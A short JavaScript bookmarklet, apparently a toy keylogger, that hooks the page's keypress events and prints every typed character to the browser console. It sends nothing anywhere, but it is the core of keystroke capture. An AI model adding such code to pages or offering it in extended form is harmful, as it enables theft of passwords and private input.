javascript:

function klog(){

	var log = "";
	document.onkeypress = function klog(event){
		key = String.fromCharCode(event.keyCode);
		log += key
		console.log(log);
	}
}

klog();

void 0;